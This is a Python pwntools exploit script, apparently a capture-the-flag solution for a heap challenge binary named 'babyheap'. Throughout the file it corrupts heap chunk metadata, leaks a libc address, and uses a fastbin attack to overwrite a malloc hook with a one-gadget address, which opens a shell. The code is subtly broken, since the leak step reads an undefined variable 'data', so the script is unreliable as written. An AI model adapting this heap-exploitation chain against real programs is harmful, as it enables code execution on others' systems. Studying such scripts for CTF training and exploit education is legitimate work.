#!/usr/bin/env python

# https://github.com/shellphish/how2heap

import os
import string
from pwn import *


context(arch="amd64", os="linux", endian="little")
context.log_level = "DEBUG"

bin_path = "./babyheap"
libc_path = "./libc.so.6"


class Exploit:
    def __init__(self):
        self.e = ELF(bin_path)
        self.libc = ELF(libc_path)
        self.p = None

    def start(self):
        self.p = process(bin_path)
        self.p.recvuntil("Command: ")

    def heap_allocate(self, length):
        self.p.sendline("1")
        self.p.recvuntil("Size: ")
        self.p.sendline(str(length))
        self.p.recvuntil("Command: ")

    def heap_fill(self, idx, length, content=None):
        self.p.sendline("2")
        self.p.recvuntil("Index: ")
        self.p.sendline(str(idx))
        self.p.recvuntil("Size: ")
        self.p.sendline(str(length))
        self.p.recvuntil("Content: ")
        if(content is None):
            self.p.send(p8(0x00)*length)
        else:
            self.p.send(content)
        self.p.recvuntil("Command: ")

    def heap_free(self, idx):
        self.p.sendline("3")
        self.p.recvuntil("Index: ")
        self.p.sendline(str(idx))
        self.p.recvuntil("Command: ")

    def heap_dump(self, idx):
        self.p.sendline("4")
        self.p.recvuntil("Index: ")
        self.p.sendline(str(idx))
        return self.p.recvuntil("Command: ")

    def exploit(self):
        self.start()
        self.prepare()
        self.p.interactive()
        self.p.close()

    def prepare(self):
        self.heap_allocate(0x10)
        self.heap_allocate(0x10)
        self.heap_allocate(0x10)
        self.heap_allocate(0x10)
        self.heap_allocate(0x80)
        self.heap_allocate(0x80)
        self.heap_free(2)
        self.heap_free(1)
        self.heap_fill(0, 0x21, "A"*0x18+p64(0x21)+p8(0x80))
        self.heap_fill(3, 0x20, "B"*0x18+p64(0x21))
        self.heap_allocate(0x10)
        self.heap_allocate(0x10)
        self.heap_fill(3, 32, "C"*0x18+p64(0x91))
        self.heap_free(4)
        libc_leak = self.heap_dump(2)[10:]
        libc_leak = u64(data[:6]+"\x00"*0x2)
        libc_base = libc_leak-0x399b58
        log.info("leak"+hex(libc_leak))
        log.info('libc_base: ' + hex(libc_base))
        hook_offset = 0x399acd
        hook_addr = libc_base+hook_offset
        oneshot_offset = 0x3f35a
        oneshot = libc_base+oneshot_offset
        self.heap_allocate(0x68)
        self.heap_allocate(0x68)
        self.heap_allocate(0x68)
        self.heap_allocate(0x68)
        self.heap_free(8)
        self.heap_free(7)
        self.heap_fill(6, 0x78, "D"*0x68+p64(0x70)+p64(hook_addr))
        self.heap_allocate(0x68)
        self.heap_allocate(0x68)
        self.heap_fill(8, 0x1b, "E"*0x13+p64(oneshot))
        self.p.sendline("1")
        self.p.recvuntil("Size: ")
        self.p.sendline(str(0x539))


def main():
    babyheap = Exploit()
    babyheap.exploit()


if __name__ == "__main__":
    main()
